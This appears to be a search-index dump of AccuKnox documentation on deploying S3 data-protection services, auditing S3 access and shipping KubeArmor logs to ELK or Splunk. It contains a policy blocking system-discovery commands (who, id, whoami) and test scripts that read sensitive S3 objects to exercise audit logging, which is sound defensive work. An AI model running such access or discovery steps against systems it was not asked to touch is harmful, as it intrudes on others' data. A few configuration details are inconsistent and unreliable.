data-pipeline-api \u00b6 Download tgz file data-pipeline-api-charts.tar.gz Create namespace for data-pippeline-api kubectl create namespace accuknox-dev- datapippeline-api Install using helm helm upgrade --install data-pipeline-api data-pipeline-api-charts.tar.gz \u2013n accuknox-dev- datapippeline-api Verify the installation of data-pippeline-api. [Pods status should be running] kubectl get pods -n accuknox-dev- datapippeline-api 2. datapipeline-temporal: \u00b6 Download tgz file datapipeline-temporal-charts.tar.gz Create namespace for datapipeline-temporal kubectl create namespace accuknox-dev- temporal Install using helm helm upgrade --install datapipeline-temporal datapipeline-temporal-charts.tar.gz \u2013n accuknox-dev- temporal Verify the installation of datapipeline-temporal [Pods status should be running] kubectl get pods -n accuknox-dev- temporal User Management \u00b6 1. Keycloak: \u00b6 Download tgz file of keycloak-charts.tar.gz keycloak.tar.gz Create namespace for user-management-service & keycloak kubectl create namespace accuknox-dev-user-mgmt Install using helm helm upgrade --install keycloak keycloak-charts.tar.gz -n accuknox-dev- user-mgmt Verify the installation of keycloak [Pods status should be running] kubectl get pods -n accuknox-dev-user-mgmt 2. user-management-service: \u00b6 Download tgz file of user-management-service user-management-service.tar.gz Install using helm helm upgrade --install user-mgmt user-management-service.tar.gz -n accuknox-dev-user-mgmt Verify the installation of user-management-service [Pods status should be running] kubectl get pods -n accuknox-dev-user-mgmt 3. UI \u00b6 Install nginx application on VM Configure the certmanager(https) (eg: letsencrypt) Untar the build tar -xvf build.tar.gz sudo cp -rvf build/* /usr/share/nginx/html/accuknox-app Start the service","title":"S3 Data Protection - Installation & Deployment Steps for Various Modules"},{"location":"s3-data-protection/overview/#s3-data-protection-installation-deployment-steps-for-various-modules","text":"","title":"S3 Data Protection - Installation &amp; Deployment Steps for Various Modules"},{"location":"s3-data-protection/overview/#installation-flow","text":"","title":"Installation Flow"},{"location":"s3-data-protection/overview/#1-backend-platform","text":"Kubernetes cluster Installing the backend software components in the kubernetes cluster Setup Databases - MySQL, Pinot Setup Kafka Install Istio in Kubernetes Microservices Setup Istio API Gateway (Internal)","title":"1. Backend Platform"},{"location":"s3-data-protection/overview/#2-ui-frontend","text":"Setup a VM with Nginx as webserver and point to the HTML UI build","title":"2. UI - Frontend"},{"location":"s3-data-protection/overview/#3-s3-data-audit-poc","text":"Setup 5 S3 buckets (5 for Data Bucket, atleast 1 bucket for logs). Populate some files using the provided script. Setup the S3 Audit Log Reporter Agent in a VM. Configure the data buckets and logs buckets in YAML file. Note: Please install the pre-requisites below before proceeding with deploying the modules: MySql Operator Kafka Operator Pinot Deployment Steps Istio & it's gateway installation","title":"3. S3 Data Audit POC"},{"location":"s3-data-protection/overview/#architecture-diagram","text":"","title":"Architecture Diagram"},{"location":"s3-data-protection/overview/#data-protection","text":"","title":"Data Protection"},{"location":"s3-data-protection/overview/#1-data-protection-management","text":"Download tgz file of data-protection-management data-protection-mgmt.tar.gz Create namespace for data-protection-management kubectl create namespace accuknox-dev-data-protection-mgmt Install using Helm helm upgrade --install data-protection- mgmt data-protection-mgmt.tar.gz \u2013n accuknox-dev-data-protection-mgmt Verify the installation of data-protection-management kubectl get pods -n accuknox-dev-data-protection-mgmt","title":"1. Data-protection-management"},{"location":"s3-data-protection/overview/#2-s3-audit-reporter-consumer","text":"Download tgz file of s3-audit-reporter-consumer s3-audit-reporter-consumer-charts.tar.gz Create namespace for s3-audit-reporter-consumer kubectl create namespace accuknox-dev- s3-audit-reporter-consumer Install using helm helm upgrade --install s3-audit-reporter-consumer s3-audit-reporter- consumer-charts.tar.gz \u2013n accuknox-dev- s3-audit-reporter-consumer Verify the installation of s3-audit-reporter-consumer kubectl get pods -n accuknox-dev- s3-audit-reporter-consumer","title":"2. s3-audit-reporter-consumer"},{"location":"s3-data-protection/overview/#3-agent-data-collector","text":"Download tgz file of agent-data-collector agent-data-collector-charts.tar.gz Create namespace for agent-data-collector kubectl create namespace accuknox-dev- agent-data-collector Install using helm helm upgrade --install agent-data-collector agent-data-collector- charts.tar.gz \u2013n accuknox-dev- agent-data-collector Verify the installation of agent-data-collector kubectl get pods -n accuknox-dev- agent-data-collector","title":"3. agent-data-collector"},{"location":"s3-data-protection/overview/#4-s3-audit-reporter","text":"Download tgz file of s3-audit-reporter s3-audit-reporter-charts.tar.gz Untar the file tar -xvf s3-audit-reporter.tar.gz Move to the directory of s3-audit-reporter cd s3-audit-reporter Create namespace for s3-audit-reporter kubectl create namespace [ namespace ] Install Configmap using kubectl, please update with your bucket details kubectl apply \u2013f dev-config.yaml \u2013n [ namespace ] Install Secrets using kubectl kubectl apply \u2013f dev-image-secrets.yaml\u2013n [ namespace ] kubectl apply \u2013f dev-deployment.yaml\u2013n [ namespace ] Verify the installation of s3-audit-reporter kubectl get pods -n [ namespace ]","title":"4. s3-audit-reporter"},{"location":"s3-data-protection/overview/#data-pipeline","text":"","title":"Data Pipeline"},{"location":"s3-data-protection/overview/#1-data-pipeline-api","text":"Download tgz file data-pipeline-api-charts.tar.gz Create namespace for data-pippeline-api kubectl create namespace accuknox-dev- datapippeline-api Install using helm helm upgrade --install data-pipeline-api data-pipeline-api-charts.tar.gz \u2013n accuknox-dev- datapippeline-api Verify the installation of data-pippeline-api. [Pods status should be running] kubectl get pods -n accuknox-dev- datapippeline-api","title":"1. data-pipeline-api"},{"location":"s3-data-protection/overview/#2-datapipeline-temporal","text":"Download tgz file datapipeline-temporal-charts.tar.gz Create namespace for datapipeline-temporal kubectl create namespace accuknox-dev- temporal Install using helm helm upgrade --install datapipeline-temporal datapipeline-temporal-charts.tar.gz \u2013n accuknox-dev- temporal Verify the installation of datapipeline-temporal [Pods status should be running] kubectl get pods -n accuknox-dev- temporal","title":"2. datapipeline-temporal:"},{"location":"s3-data-protection/overview/#user-management","text":"","title":"User Management"},{"location":"s3-data-protection/overview/#1-keycloak","text":"Download tgz file of keycloak-charts.tar.gz keycloak.tar.gz Create namespace for user-management-service & keycloak kubectl create namespace accuknox-dev-user-mgmt Install using helm helm upgrade --install keycloak keycloak-charts.tar.gz -n accuknox-dev- user-mgmt Verify the installation of keycloak [Pods status should be running] kubectl get pods -n accuknox-dev-user-mgmt","title":"1. Keycloak:"},{"location":"s3-data-protection/overview/#2-user-management-service","text":"Download tgz file of user-management-service user-management-service.tar.gz Install using helm helm upgrade --install user-mgmt user-management-service.tar.gz -n accuknox-dev-user-mgmt Verify the installation of user-management-service [Pods status should be running] kubectl get pods -n accuknox-dev-user-mgmt","title":"2. user-management-service:"},{"location":"s3-data-protection/overview/#3-ui","text":"Install nginx application on VM Configure the certmanager(https) (eg: letsencrypt) Untar the build tar -xvf build.tar.gz sudo cp -rvf build/* /usr/share/nginx/html/accuknox-app Start the service","title":"3. UI"},{"location":"s3-data-protection/pinot-deployment/","text":"Pinot Deployment \u00b6 Note 1. Do not change the namespace name. If changes to the namespace are made, then you will need to change the service name & if the service name is changed, you will to need to change the microservice configmap files. (eg) app.yaml. 2. Please create a node pool on EKS / GKE / AKS (or) on-premise worker nodes with below Taints and Labels: Taints - pinot:true Labels -pinot:true Steps \u00b6 untar pinot deployment files untar accuknox-pinot-dev.tar.xz Create Namespace kubectl create namespace accuknox-dev-pinot Set context kubectl config set-context --current --namespace=accuknox-dev-pinot Install Helm pkg helm install accuknox-dev-pinot accuknox-pinot-dev/ Check the pods deployment kubectl get pods -n accuknox-dev-pinot","title":"Pinot Deployment"},{"location":"s3-data-protection/pinot-deployment/#pinot-deployment","text":"Note 1. Do not change the namespace name. If changes to the namespace are made, then you will need to change the service name & if the service name is changed, you will to need to change the microservice configmap files. (eg) app.yaml. 2. Please create a node pool on EKS / GKE / AKS (or) on-premise worker nodes with below Taints and Labels: Taints - pinot:true Labels -pinot:true","title":"Pinot Deployment"},{"location":"s3-data-protection/pinot-deployment/#steps","text":"untar pinot deployment files untar accuknox-pinot-dev.tar.xz Create Namespace kubectl create namespace accuknox-dev-pinot Set context kubectl config set-context --current --namespace=accuknox-dev-pinot Install Helm pkg helm install accuknox-dev-pinot accuknox-pinot-dev/ Check the pods deployment kubectl get pods -n accuknox-dev-pinot","title":"Steps"},{"location":"s3-data-protection/s3-access-audit/","text":"AccuKnox S3 Access Audit \u00b6 AccuKnox S3 Access Audit allows you to audit the access of the objects stored in an AWS S3 bucket. With AccuKnox S3 Access Audit, users can understand what operation was performed on S3 objects, the status of the operation, who performed the operation and when the operation was performed on an S3 object. Assumptions \u00b6 We assume that we have the following 5 AWS S3 buckets created: Sr.No. Data Bucket Name Logs Bucket Name 1. ak-exp-poc-1-data ak-exp-poc-1-logs 2. ak-exp-poc-2-data ak-exp-poc-2-data 3. ak-exp-poc-3-data ak-exp-poc-3-logs 4. ak-exp-poc-4-data ak-exp-poc-4-logs 5. ak-exp-poc-5-data ak-exp-poc-5-logs Data Buckets are the buckets where we store the actual data. Logs buckets are where the S3 Access logs are written to by AWS S3 Server. Upload some files in all those buckets. Create data buckets: https://docs.aws.amazon.com/AmazonS3/latest/userguide/create-bucket-overview.html Configure log buckets: https://docs.aws.amazon.com/AmazonS3/latest/userguide/enable-server-access-logging.html We also assume that the S3 buckets are not public and are not accessible outside the s3-data-protection's environment. Upload multiple test files to each of the data buckets: unzip s3-data-protection-poc.zip cd s3-data-protection-poc/setup update <access_key>, <secret_key> and <region> in upload_files.sh Run upload_files.sh for each buckets: ./upload_files.sh <bucket-name> S. No Bucket Name Command 1 ak-exp-poc-1-data ./upload_files.sh ak-exp-poc-1-data 2 ak-exp-poc-2-data ./upload_files.sh ak-exp-poc-2-data 3 ak-exp-poc-3-data ./upload_files.sh ak-exp-poc-3-data 4 ak-exp-poc-4-data ./upload_files.sh ak-exp-poc-4-data 5 ak-exp-poc-5-data ./upload_files.sh ak-exp-poc-5-data How To \u00b6 In order to setup AccuKnox S3 Access Audit perform the following steps: Visit AccuKnox Platform Login using the email and password. Select or create a new workspace On the left navigation pane, select Data Protection Next, select Data Sources Click on the Configure Data Source button at the top right corner Choose No for Is the s3 bucket mounted inside a container workload? Choose No for Is your S3 access log buckets accessible from outside your private network? In our scenario, we do not have S3 bucket objects accessible from outside the private network, hence click on Done . Follow the steps here to install the AccuKnox S3 Audit Reporter Agent . Once the agent has been configured and is running, it'll start syncing the objects in the data bucket with AccuKnox Platform. Now, on the left navigation pane, under Data Protection , click on Sensitive Source Labels Enter a value for Label . Under S3 BUCKET on the left, select the bucket you want to configure sensitive sources from and select the objects that are sensitive on the right. Click on Next . We can skip the Configure Flagged Destination step. Review the selection and click on Create Testing Scenarios \u00b6 Until now, we have configured sensitive sources - the objects we think are sensitive. Now, use the AWS CLI to access the files in the data buckets as mentioned here - POC Scenarios . Then, at the AccuKnox Platform, on the left navigation pane, select S3 Access Logs. Now, you should be able to see the S3 access information. Heading Description BUCKET NAME The name of the bucket that the request was processed against. TIMESTAMP The time at which the request was received REQUESTER The canonical user ID of the requester, or a - for unauthenticated requests KEY The \"key\" part of the request, URL encoded, or \"-\" if the operation does not take a key parameter. In simple words, the object path. OPERATION The operation that was performed in the current request. HTTP STATUS The numeric HTTP status code of the response.","title":"AccuKnox S3 Access Audit"},{"location":"s3-data-protection/s3-access-audit/#accuknox-s3-access-audit","text":"AccuKnox S3 Access Audit allows you to audit the access of the objects stored in an AWS S3 bucket. With AccuKnox S3 Access Audit, users can understand what operation was performed on S3 objects, the status of the operation, who performed the operation and when the operation was performed on an S3 object.","title":"AccuKnox S3 Access Audit"},{"location":"s3-data-protection/s3-access-audit/#assumptions","text":"We assume that we have the following 5 AWS S3 buckets created: Sr.No. Data Bucket Name Logs Bucket Name 1. ak-exp-poc-1-data ak-exp-poc-1-logs 2. ak-exp-poc-2-data ak-exp-poc-2-data 3. ak-exp-poc-3-data ak-exp-poc-3-logs 4. ak-exp-poc-4-data ak-exp-poc-4-logs 5. ak-exp-poc-5-data ak-exp-poc-5-logs Data Buckets are the buckets where we store the actual data. Logs buckets are where the S3 Access logs are written to by AWS S3 Server. Upload some files in all those buckets. Create data buckets: https://docs.aws.amazon.com/AmazonS3/latest/userguide/create-bucket-overview.html Configure log buckets: https://docs.aws.amazon.com/AmazonS3/latest/userguide/enable-server-access-logging.html We also assume that the S3 buckets are not public and are not accessible outside the s3-data-protection's environment. Upload multiple test files to each of the data buckets: unzip s3-data-protection-poc.zip cd s3-data-protection-poc/setup update <access_key>, <secret_key> and <region> in upload_files.sh Run upload_files.sh for each buckets: ./upload_files.sh <bucket-name> S. No Bucket Name Command 1 ak-exp-poc-1-data ./upload_files.sh ak-exp-poc-1-data 2 ak-exp-poc-2-data ./upload_files.sh ak-exp-poc-2-data 3 ak-exp-poc-3-data ./upload_files.sh ak-exp-poc-3-data 4 ak-exp-poc-4-data ./upload_files.sh ak-exp-poc-4-data 5 ak-exp-poc-5-data ./upload_files.sh ak-exp-poc-5-data","title":"Assumptions"},{"location":"s3-data-protection/s3-access-audit/#how-to","text":"In order to setup AccuKnox S3 Access Audit perform the following steps: Visit AccuKnox Platform Login using the email and password. Select or create a new workspace On the left navigation pane, select Data Protection Next, select Data Sources Click on the Configure Data Source button at the top right corner Choose No for Is the s3 bucket mounted inside a container workload? Choose No for Is your S3 access log buckets accessible from outside your private network? In our scenario, we do not have S3 bucket objects accessible from outside the private network, hence click on Done . Follow the steps here to install the AccuKnox S3 Audit Reporter Agent . Once the agent has been configured and is running, it'll start syncing the objects in the data bucket with AccuKnox Platform. Now, on the left navigation pane, under Data Protection , click on Sensitive Source Labels Enter a value for Label . Under S3 BUCKET on the left, select the bucket you want to configure sensitive sources from and select the objects that are sensitive on the right. Click on Next . We can skip the Configure Flagged Destination step. Review the selection and click on Create","title":"How To"},{"location":"s3-data-protection/s3-access-audit/#testing-scenarios","text":"Until now, we have configured sensitive sources - the objects we think are sensitive. Now, use the AWS CLI to access the files in the data buckets as mentioned here - POC Scenarios . Then, at the AccuKnox Platform, on the left navigation pane, select S3 Access Logs. Now, you should be able to see the S3 access information. Heading Description BUCKET NAME The name of the bucket that the request was processed against. TIMESTAMP The time at which the request was received REQUESTER The canonical user ID of the requester, or a - for unauthenticated requests KEY The \"key\" part of the request, URL encoded, or \"-\" if the operation does not take a key parameter. In simple words, the object path. OPERATION The operation that was performed in the current request. HTTP STATUS The numeric HTTP status code of the response.","title":"Testing Scenarios"},{"location":"s3-data-protection/test-scenarios/","text":"S3 Data Protection Test Scenarios: \u00b6 Note: unzipped s3-data-protection-poc directory contains test scripts that will access sensitive objects in s3 data buckets. cd s3-data-protection-poc Accessing AWS S3 Bucket - Access sensitive data with valid credentials \u00b6 S. No Test scripts Expected Output 1. cd tests/valid_creds ./access_ak-exp-poc-1-data_secret1.sh <access_key> <secret_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 200 2. cd tests/valid_creds ./access_ak-exp-poc-2-data_secret3.sh <access_key> <secret_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 200 3. cd tests/valid_creds ./access_ak-exp-poc-3-data_secret5.sh <access_key> <secret_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 200 4. cd tests/valid_creds ./access_ak-exp-poc-4-data_secret4.sh <access_key> <secret_key> <region> <bucket_name> User should see s3 User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 200 5. cd tests/valid_creds ./access_ak-exp-poc-5-data_secret6.sh <access_key> <secret_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 200 Accessing AWS S3 Bucket - Access sensitive data with invalid credentials \u00b6 S. No Test scripts Expected Output 1. cd tests/invalid_creds access_ak-exp-poc-1-data_secret1_invalid_accessKey.sh <secret_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 403 2. cd tests/invalid_creds access_ak-exp-poc-2-data_secret3_invalid_accessKey.sh <secret_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 403 3. cd tests/invalid_creds access_ak-exp-poc-3-data_secret5._invalid_secret.sh <access_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 403 4. cd tests/invalid_creds access_ak-exp-poc-4-data_secret4._invalid_secret.sh <access_key> <region> <bucket_name> User should see s3 User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 403 5. cd tests/invalid_creds access_ak-exp-poc-5-data_secret6._invalid_secret.sh <access_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 403","title":"S3 Data Protection Test Scenarios:"},{"location":"s3-data-protection/test-scenarios/#s3-data-protection-test-scenarios","text":"Note: unzipped s3-data-protection-poc directory contains test scripts that will access sensitive objects in s3 data buckets. cd s3-data-protection-poc","title":"S3 Data Protection Test Scenarios:"},{"location":"s3-data-protection/test-scenarios/#accessing-aws-s3-bucket-access-sensitive-data-with-valid-credentials","text":"S. No Test scripts Expected Output 1. cd tests/valid_creds ./access_ak-exp-poc-1-data_secret1.sh <access_key> <secret_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 200 2. cd tests/valid_creds ./access_ak-exp-poc-2-data_secret3.sh <access_key> <secret_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 200 3. cd tests/valid_creds ./access_ak-exp-poc-3-data_secret5.sh <access_key> <secret_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 200 4. cd tests/valid_creds ./access_ak-exp-poc-4-data_secret4.sh <access_key> <secret_key> <region> <bucket_name> User should see s3 User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 200 5. cd tests/valid_creds ./access_ak-exp-poc-5-data_secret6.sh <access_key> <secret_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 200","title":"Accessing AWS S3 Bucket - Access sensitive data with valid credentials"},{"location":"s3-data-protection/test-scenarios/#accessing-aws-s3-bucket-access-sensitive-data-with-invalid-credentials","text":"S. No Test scripts Expected Output 1. cd tests/invalid_creds access_ak-exp-poc-1-data_secret1_invalid_accessKey.sh <secret_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 403 2. cd tests/invalid_creds access_ak-exp-poc-2-data_secret3_invalid_accessKey.sh <secret_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 403 3. cd tests/invalid_creds access_ak-exp-poc-3-data_secret5._invalid_secret.sh <access_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 403 4. cd tests/invalid_creds access_ak-exp-poc-4-data_secret4._invalid_secret.sh <access_key> <region> <bucket_name> User should see s3 User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 403 5. cd tests/invalid_creds access_ak-exp-poc-5-data_secret6._invalid_secret.sh <access_key> <region> <bucket_name> User should see s3 access information for get-object operation of the sensitive data in s3 access logs page. HTTP status should be 403","title":"Accessing AWS S3 Bucket - Access sensitive data with invalid credentials"},{"location":"saas-elk/elk/","text":"Overview \u00b6 A following steps to shipping your onboard cluster logs to Accuknox SAAS ELK Step 1: Edit Feeder-service chart \u00b6 helm pull accuknox-agents/feeder-service --untar ls feeder-service Follow the below steps to update ELK endpoint: 1.1 Open the Values.yaml 1.2 Search the keyword [ELASTICSEARCH_HOST] 1.3 Update the ELK endpoint or DNS (kubectl get svc -n ) Step 2: Helm Upgrade Feeder-service \u00b6 helm upgrade --install feeder-service feeder-service --set elastic.enabled = false --set kibana.enabled = false -n accuknox-agents Note: Disabling Kibana and Elastic-search helm package installing Step 3: Login in to Kibana Dashboard \u00b6 1. Apply the policy nano nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : tags : [ \"MITRE\" , \"T1082\" ] message : \"System owner discovery command is blocked\" selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/who - path : /usr/bin/w - path : /usr/bin/id - path : /usr/bin/whoami action : Block kubectl apply -f nginx-kubearmor-policy.yaml 2. Violating the policy kubectl exec -it nginx-766b69bd4b-wqnpj -- bash kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log 3. Verify the logs in kibana dashboard Use \"kubearmor\" keyword in kibana dashboard Note: Follow the below command If Logs are not showing in ELK: 1. Execute in to feeder-service pod kubectl exec -it feeder-service-7c9f847c76-fwtqj -c filebeat-sidecar -n accuknox-agents -- bash 2. Start the filebeat service filebeat run -e \u201c*\u201d","title":"ELK"},{"location":"saas-elk/elk/#overview","text":"A following steps to shipping your onboard cluster logs to Accuknox SAAS ELK","title":"Overview"},{"location":"saas-elk/elk/#step-1-edit-feeder-service-chart","text":"helm pull accuknox-agents/feeder-service --untar ls feeder-service Follow the below steps to update ELK endpoint: 1.1 Open the Values.yaml 1.2 Search the keyword [ELASTICSEARCH_HOST] 1.3 Update the ELK endpoint or DNS (kubectl get svc -n )","title":"Step 1: Edit Feeder-service chart"},{"location":"saas-elk/elk/#step-2-helm-upgrade-feeder-service","text":"helm upgrade --install feeder-service feeder-service --set elastic.enabled = false --set kibana.enabled = false -n accuknox-agents Note: Disabling Kibana and Elastic-search helm package installing","title":"Step 2: Helm Upgrade Feeder-service"},{"location":"saas-elk/elk/#step-3-login-in-to-kibana-dashboard","text":"1. Apply the policy nano nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : tags : [ \"MITRE\" , \"T1082\" ] message : \"System owner discovery command is blocked\" selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/who - path : /usr/bin/w - path : /usr/bin/id - path : /usr/bin/whoami action : Block kubectl apply -f nginx-kubearmor-policy.yaml 2. Violating the policy kubectl exec -it nginx-766b69bd4b-wqnpj -- bash kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log 3. Verify the logs in kibana dashboard Use \"kubearmor\" keyword in kibana dashboard Note: Follow the below command If Logs are not showing in ELK: 1. Execute in to feeder-service pod kubectl exec -it feeder-service-7c9f847c76-fwtqj -c filebeat-sidecar -n accuknox-agents -- bash 2. Start the filebeat service filebeat run -e \u201c*\u201d","title":"Step 3: Login in to Kibana Dashboard"},{"location":"saas-splunk/splunk/","text":"Overview \u00b6 A following steps to shipping your onboard cluster logs to Accuknox SAAS Splunk Step 1: Edit Feeder-service chart \u00b6 helm pull accuknox-agents/feeder-service --untar ls feeder-service Follow the below steps to update splunk endpoint: 1.1 Open the Values.yaml 1.2 Search the keyword [ELASTICSEARCH_HOST] 1.3 Update the Splunk endpoint or DNS (kubectl get svc -n ) Step 2: Helm Upgrade Feeder-service \u00b6 helm upgrade --install feeder-service feeder-service --set elastic.enabled = false --set kibana.enabled = false -n accuknox-agents Note: Disabling Kibana and Elastic-search helm package installing Step 3: Login in to Splunk Dashboard \u00b6 1. Apply the policy nano nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : tags : [ \"MITRE\" , \"T1082\" ] message : \"System owner discovery command is blocked\" selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/who - path : /usr/bin/w - path : /usr/bin/id - path : /usr/bin/whoami action : Block kubectl apply -f nginx-kubearmor-policy.yaml 2. Violating the policy kubectl exec -it nginx-766b69bd4b-wqnpj -- bash kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log 3. Verify the logs in Splunk dashboard Use \"kubearmor\" keyword in Splunk dashboard","title":"Splunk"},{"location":"saas-splunk/splunk/#overview","text":"A following steps to shipping your onboard cluster logs to Accuknox SAAS Splunk","title":"Overview"},{"location":"saas-splunk/splunk/#step-1-edit-feeder-service-chart","text":"helm pull accuknox-agents/feeder-service --untar ls feeder-service Follow the below steps to update splunk endpoint: 1.1 Open the Values.yaml 1.2 Search the keyword [ELASTICSEARCH_HOST] 1.3 Update the Splunk endpoint or DNS (kubectl get svc -n )","title":"Step 1: Edit Feeder-service chart"},{"location":"saas-splunk/splunk/#step-2-helm-upgrade-feeder-service","text":"helm upgrade --install feeder-service feeder-service --set elastic.enabled = false --set kibana.enabled = false -n accuknox-agents Note: Disabling Kibana and Elastic-search helm package installing","title":"Step 2:  Helm Upgrade Feeder-service"},{"location":"saas-splunk/splunk/#step-3-login-in-to-splunk-dashboard","text":"1. Apply the policy nano nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : tags : [ \"MITRE\" , \"T1082\" ] message : \"System owner discovery command is blocked\" selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/who - path : /usr/bin/w - path : /usr/bin/id - path : /usr/bin/whoami action : Block kubectl apply -f nginx-kubearmor-policy.yaml 2. Violating the policy kubectl exec -it nginx-766b69bd4b-wqnpj -- bash kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 karmor log 3. Verify the logs in Splunk dashboard Use \"kubearmor\" keyword in Splunk dashboard","title":"Step 3: Login in to Splunk Dashboard"},{"location":"telemetry/overview/","text":"Telemetry screens are used to monitor the workspace and keep track of our activities, such as the HTTP requests we make and the replies we receive. It will display the information in a graphical chart with the time period on the x-axis and the response output on the y-axis. It also provides sophisticated features, such as the ability to retrieve output for specific components like, clusters, namespaces, and so on. This also implies that we may filter our data for a given time span based on cluster, namespace, pod, and other factors. This section will explain in detail about the telemetry screen in detail for the following components: Telemetry Screen for Kubernetes clusters Telemetry Screen for Virtual Machine","title":"What are Telemetry Screens?"},{"location":"telemetry/telemetry-gke/","text":"The data on the telemetry panel is separated into four categories. Network System Anomaly Detection Data Protection Network \u00b6 The network gives information about the HTTP calls and the protocols used by our sources. It also displays specific information based on the cluster, namespace, pod, and traffic direction. The above image is an example of the list of HTTP calls that occur on our telemetry screen. it will display the response per sec for the HTTP GET, POST and PUT requests we made at this time, and the HTTP responses per sec if its load successfully(200) or an error(404). The above image is an example of the protocol information given by the telemetry screen. It displays the information about the network protocols (ICMPv6, ICMPv4, TCP, UDP) usage and the HTTP protocols(HTTP/1.1, HTTP/2.1) usage. The above image is an example of the layer 7 5xx and 4xx resquests happening per second. The graph also gives the number of forwarded and dropped operation happening per second. System \u00b6 The system graphs gives information about the system policy logs. It shows the severity level of the logs and the action happened. It also gives specific information based on the cluster, namespace, container, pod, hostname, and the policy we applied. The above image is an example of system policy logs on the telemetry screen which displays severity logs along with action logs. The above image is an example of system policy logs on the telemetry screen which displays number of logs with a given operation and number of logs with a given host The above image is an example of system policy logs on the telemetry screen which displays number of logs with a given namespace and number of logs with a given pod The above image is an example of system policy logs on the telemetry screen which displays number of logs with a given container and number of logs with a given policy The above image is an example of system policy logs on the telemetry screen which displays number of logs with a given type Anomaly Detection \u00b6 Anomaly Detection displays the information about the anomalies occurring on our sources. It displays the information about the errors that occurred and the process activities happened. It also displays specific informations based on the cluster, namespace, and container. The above image is an example of anomaly detection telemetry occurring on the SaaS telemetry screen. It displays the count of errors or baseline that occurred at a time and it gives the count of process activities(forked, executed, killed) and total process count. Data Protection \u00b6 Data Protection gives information about unauthorized users trying to access sensitive sources. It also gives the information based on cluster, container, namespace, and node. The above image is an example of data protection telemetry occurring on SaaS telemetry screens. It plots the graphs with Flagged destination access on sensitive data Unknown destination access on sensitive data Total number of access on each sensitive data Total number of alerts generated with severity","title":"Telemetry Screen for Kubernetes"},{"location":"telemetry/telemetry-gke/#network","text":"The network gives information about the HTTP calls and the protocols used by our sources. It also displays specific information based on the cluster, namespace, pod, and traffic direction. The above image is an example of the list of HTTP calls that occur on our telemetry screen. it will display the response per sec for the HTTP GET, POST and PUT requests we made at this time, and the HTTP responses per sec if its load successfully(200) or an error(404). The above image is an example of the protocol information given by the telemetry screen. It displays the information about the network protocols (ICMPv6, ICMPv4, TCP, UDP) usage and the HTTP protocols(HTTP/1.1, HTTP/2.1) usage. The above image is an example of the layer 7 5xx and 4xx resquests happening per second. The graph also gives the number of forwarded and dropped operation happening per second.","title":"Network"},{"location":"telemetry/telemetry-gke/#system","text":"The system graphs gives information about the system policy logs. It shows the severity level of the logs and the action happened. It also gives specific information based on the cluster, namespace, container, pod, hostname, and the policy we applied. The above image is an example of system policy logs on the telemetry screen which displays severity logs along with action logs. The above image is an example of system policy logs on the telemetry screen which displays number of logs with a given operation and number of logs with a given host The above image is an example of system policy logs on the telemetry screen which displays number of logs with a given namespace and number of logs with a given pod The above image is an example of system policy logs on the telemetry screen which displays number of logs with a given container and number of logs with a given policy The above image is an example of system policy logs on the telemetry screen which displays number of logs with a given type","title":"System"},{"location":"telemetry/telemetry-gke/#anomaly-detection","text":"Anomaly Detection displays the information about the anomalies occurring on our sources. It displays the information about the errors that occurred and the process activities happened. It also displays specific informations based on the cluster, namespace, and container. The above image is an example of anomaly detection telemetry occurring on the SaaS telemetry screen. It displays the count of errors or baseline that occurred at a time and it gives the count of process activities(forked, executed, killed) and total process count.","title":"Anomaly Detection"},{"location":"telemetry/telemetry-gke/#data-protection","text":"Data Protection gives information about unauthorized users trying to access sensitive sources. It also gives the information based on cluster, container, namespace, and node. The above image is an example of data protection telemetry occurring on SaaS telemetry screens. It plots the graphs with Flagged destination access on sensitive data 